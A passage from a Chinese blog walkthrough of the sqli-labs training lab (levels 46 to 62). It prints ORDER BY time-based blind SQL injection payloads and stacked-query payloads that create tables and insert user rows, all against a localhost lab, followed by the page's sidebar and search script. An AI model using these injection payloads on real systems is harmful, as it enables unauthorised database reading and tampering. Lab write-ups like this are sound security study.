users),&apos;~&apos;))--+</span><br><span class="line"></span><br><span class="line">延时注入例子 :</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-46/?sort=(SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(&apos;1&apos;)),null) FROM (select database() as current) as tb1)</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-47-（order-by-注入）"><a href="#Less-47-（order-by-注入）" class="headerlink" title="Less-47 （order by 注入）"></a>Less-47 （order by 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-46 只是多了一个单引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-48（order-by-盲注）"><a href="#Less-48（order-by-盲注）" class="headerlink" title="Less-48（order by 盲注）"></a>Less-48（order by 盲注）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类似 less-46 无报错信息，所以需要盲注</span><br><span class="line">如：</span><br><span class="line">?sort=1 and if(length(database())=8,sleep(4),1)--+</span><br><span class="line">?sort=1 and if(ascii(left(database(),1))=115,sleep(4),1)--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-49（order-by-盲注）"><a href="#Less-49（order-by-盲注）" class="headerlink" title="Less-49（order by 盲注）"></a>Less-49（order by 盲注）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-48 多了一个单引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-50（order-by-堆叠注入）"><a href="#Less-50（order-by-堆叠注入）" class="headerlink" title="Less-50（order by 堆叠注入）"></a>Less-50（order by 堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这题使用 mysqli_multi_query 函数，所以可以执行多个语句。</span><br><span class="line"></span><br><span class="line">?sort=1;create table less50 like users -- +</span><br><span class="line">/?sort=1;insert into users(id,username,password)value(18,&apos;less50&apos;,&apos;less50&apos;)#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-51（order-by-堆叠注入）"><a href="#Less-51（order-by-堆叠注入）" class="headerlink" title="Less-51（order by 堆叠注入）"></a>Less-51（order by 堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-50 多了一个单引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-52（order-by-堆叠注入）"><a href="#Less-52（order-by-堆叠注入）" class="headerlink" title="Less-52（order by 堆叠注入）"></a>Less-52（order by 堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-50 没有了注释</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-53（order-by-堆叠注入）"><a href="#Less-53（order-by-堆叠注入）" class="headerlink" title="Less-53（order by 堆叠注入）"></a>Less-53（order by 堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-51 没有了注释</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-54（挑战1）"><a href="#Less-54（挑战1）" class="headerlink" title="Less-54（挑战1）"></a>Less-54（挑战1）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依旧是字符型注入，只不过只有十次机会，密码就在 secret 列名里面</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-55（挑战2）"><a href="#Less-55（挑战2）" class="headerlink" title="Less-55（挑战2）"></a>Less-55（挑战2）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-54 加了一个括号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-56（挑战3）"><a href="#Less-56（挑战3）" class="headerlink" title="Less-56（挑战3）"></a>Less-56（挑战3）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-54 加了一个单引号括号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-57（挑战4）"><a href="#Less-57（挑战4）" class="headerlink" title="Less-57（挑战4）"></a>Less-57（挑战4）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-54 加了一个双引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-58（挑战5）"><a href="#Less-58（挑战5）" class="headerlink" title="Less-58（挑战5）"></a>Less-58（挑战5）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union 注入失败，但是可以进行报错注入，这次是单引号型的</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-59（挑战6）"><a href="#Less-59（挑战6）" class="headerlink" title="Less-59（挑战6）"></a>Less-59（挑战6）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-58 这次是纯数字型</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-60（挑战7）"><a href="#Less-60（挑战7）" class="headerlink" title="Less-60（挑战7）"></a>Less-60（挑战7）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-58 这次是双引号括号型的</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-61（挑战8）"><a href="#Less-61（挑战8）" class="headerlink" title="Less-61（挑战8）"></a>Less-61（挑战8）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似 less-58 这次真的猜不出...原来是单引号加两层括号...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-62（挑战9）"><a href="#Less-62（挑战9）" class="headerlink" title="Less-62（挑战9）"></a>Less-62（挑战9）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单引号括号型，但是 union 注入和报错注入已经失效，页面信息也没有变化</span><br><span class="line">所以只能进行时间盲注</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------------</div>
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PRACTICE/" rel="tag"># PRACTICE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/19/javaweb/" rel="next" title="javaweb">
+                <i class="fa fa-chevron-left"></i> javaweb
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/28/upload-labs/" rel="prev" title="upload-labs">
+                upload-labs <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Tyaoo">
+            
+              <p class="site-author-name" itemprop="name">Tyaoo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tyaoo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1（单引号-union-注入）"><span class="nav-number">1.</span> <span class="nav-text">Less-1（单引号 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2（无引号-union-注入）"><span class="nav-number">2.</span> <span class="nav-text">Less-2（无引号 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3（单引号括号-union-注入）"><span class="nav-number">3.</span> <span class="nav-text">Less-3（单引号括号 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4（双引号-union-注入）"><span class="nav-number">4.</span> <span class="nav-text">Less-4（双引号 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5（单引号双注入）"><span class="nav-number">5.</span> <span class="nav-text">Less-5（单引号双注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6（双引号双注入）"><span class="nav-number">6.</span> <span class="nav-text">Less-6（双引号双注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-7（一句话木🐎）"><span class="nav-number">7.</span> <span class="nav-text">Less-7（一句话木🐎）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8（单引号布尔盲注）"><span class="nav-number">8.</span> <span class="nav-text">Less-8（单引号布尔盲注）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9（单引号时间盲注）"><span class="nav-number">9.</span> <span class="nav-text">Less-9（单引号时间盲注）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-10（双引号时间盲注）"><span class="nav-number">10.</span> <span class="nav-text">Less-10（双引号时间盲注）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11（用户名加密的单引号-union-注入）"><span class="nav-number">11.</span> <span class="nav-text">Less-11（用户名加密的单引号 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12（用户名加密的双引号括号-union-注入）"><span class="nav-number">12.</span> <span class="nav-text">Less-12（用户名加密的双引号括号 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13（用户名的单引号括号双注入）"><span class="nav-number">13.</span> <span class="nav-text">Less-13（用户名的单引号括号双注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14（用户名的双引号双注入）"><span class="nav-number">14.</span> <span class="nav-text">Less-14（用户名的双引号双注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-15（用户名的单引号布尔注入）"><span class="nav-number">15.</span> <span class="nav-text">Less-15（用户名的单引号布尔注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-16（用户名的双引号括号布尔注入）"><span class="nav-number">16.</span> <span class="nav-text">Less-16（用户名的双引号括号布尔注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-17（用户名加密的单引号报错注入）"><span class="nav-number">17.</span> <span class="nav-text">Less-17（用户名加密的单引号报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-18（User-Agent-报错注入）"><span class="nav-number">18.</span> <span class="nav-text">Less-18（User-Agent 报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-19（Referer-报错注入）"><span class="nav-number">19.</span> <span class="nav-text">Less-19（Referer 报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-20（User-Agent-报错注入）"><span class="nav-number">20.</span> <span class="nav-text">Less-20（User-Agent 报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-21（User-Agent-加密报错注入）"><span class="nav-number">21.</span> <span class="nav-text">Less-21（User-Agent 加密报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-22（User-Agent-加密报错注入）"><span class="nav-number">22.</span> <span class="nav-text">Less-22（User-Agent 加密报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-23-（过滤注释）"><span class="nav-number">23.</span> <span class="nav-text">Less-23 （过滤注释）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-24-（二次排序漏洞）"><span class="nav-number">24.</span> <span class="nav-text">Less-24 （二次排序漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-25-（过滤-or-amp-and）"><span class="nav-number">25.</span> <span class="nav-text">Less-25 （过滤 or &amp; and）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-25a（过滤-or-amp-and-）"><span class="nav-number">26.</span> <span class="nav-text">Less-25a（过滤 or &amp; and ）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-26-（过滤空格和注释的报错注入）"><span class="nav-number">27.</span> <span class="nav-text">Less-26 （过滤空格和注释的报错注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-26a（过滤空格和注释的布尔注入）"><span class="nav-number">28.</span> <span class="nav-text">Less-26a（过滤空格和注释的布尔注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-27-（过滤-nion-和-select-的-union-注入）"><span class="nav-number">29.</span> <span class="nav-text">Less-27 （过滤 nion 和 select 的 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-27a（过滤-nion-和-select-的时间盲注）"><span class="nav-number">30.</span> <span class="nav-text">Less-27a（过滤 nion 和 select 的时间盲注）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-28（过滤-nion-和-select-的-union-注入）"><span class="nav-number">31.</span> <span class="nav-text">Less-28（过滤 nion 和 select 的 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-28a（过滤-union-和-select-的布尔注入）"><span class="nav-number">32.</span> <span class="nav-text">Less-28a（过滤 union 和 select 的布尔注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-29（WAF1）"><span class="nav-number">33.</span> <span class="nav-text">Less-29（WAF1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-30（WAF2）"><span class="nav-number">34.</span> <span class="nav-text">Less-30（WAF2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-31（WAF3）"><span class="nav-number">35.</span> <span class="nav-text">Less-31（WAF3）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-32（宽字节注入）"><span class="nav-number">36.</span> <span class="nav-text">Less-32（宽字节注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-33（宽字节注入）"><span class="nav-number">37.</span> <span class="nav-text">Less-33（宽字节注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-34（用户名和密码加反斜杠）"><span class="nav-number">38.</span> <span class="nav-text">Less-34（用户名和密码加反斜杠）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-35（加反斜杠没引号的-union-注入）"><span class="nav-number">39.</span> <span class="nav-text">Less-35（加反斜杠没引号的 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）"><span class="nav-number">40.</span> <span class="nav-text">Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）"><span class="nav-number">41.</span> <span class="nav-text">Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-38（堆叠注入）"><span class="nav-number">42.</span> <span class="nav-text">Less-38（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-39（堆叠注入）"><span class="nav-number">43.</span> <span class="nav-text">Less-39（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-40（堆叠注入）"><span class="nav-number">44.</span> <span class="nav-text">Less-40（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-41（堆叠注入）"><span class="nav-number">45.</span> <span class="nav-text">Less-41（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-42（堆叠注入）"><span class="nav-number">46.</span> <span class="nav-text">Less-42（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-43（堆叠注入）"><span class="nav-number">47.</span> <span class="nav-text">Less-43（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-44（堆叠注入）"><span class="nav-number">48.</span> <span class="nav-text">Less-44（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-45（堆叠注入）"><span class="nav-number">49.</span> <span class="nav-text">Less-45（堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-46（order-by-注入）"><span class="nav-number">50.</span> <span class="nav-text">Less-46（order by 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-47-（order-by-注入）"><span class="nav-number">51.</span> <span class="nav-text">Less-47 （order by 注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-48（order-by-盲注）"><span class="nav-number">52.</span> <span class="nav-text">Less-48（order by 盲注）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-49（order-by-盲注）"><span class="nav-number">53.</span> <span class="nav-text">Less-49（order by 盲注）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-50（order-by-堆叠注入）"><span class="nav-number">54.</span> <span class="nav-text">Less-50（order by 堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-51（order-by-堆叠注入）"><span class="nav-number">55.</span> <span class="nav-text">Less-51（order by 堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-52（order-by-堆叠注入）"><span class="nav-number">56.</span> <span class="nav-text">Less-52（order by 堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-53（order-by-堆叠注入）"><span class="nav-number">57.</span> <span class="nav-text">Less-53（order by 堆叠注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-54（挑战1）"><span class="nav-number">58.</span> <span class="nav-text">Less-54（挑战1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-55（挑战2）"><span class="nav-number">59.</span> <span class="nav-text">Less-55（挑战2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-56（挑战3）"><span class="nav-number">60.</span> <span class="nav-text">Less-56（挑战3）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-57（挑战4）"><span class="nav-number">61.</span> <span class="nav-text">Less-57（挑战4）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-58（挑战5）"><span class="nav-number">62.</span> <span class="nav-text">Less-58（挑战5）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-59（挑战6）"><span class="nav-number">63.</span> <span class="nav-text">Less-59（挑战6）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-60（挑战7）"><span class="nav-number">64.</span> <span class="nav-text">Less-60（挑战7）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-61（挑战8）"><span class="nav-number">65.</span> <span class="nav-text">Less-61（挑战8）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-62（挑战9）"><span class="nav-number">66.</span> <span class="nav-text">Less-62（挑战9）</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tyaoo</span>
+
+  
+</div>
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
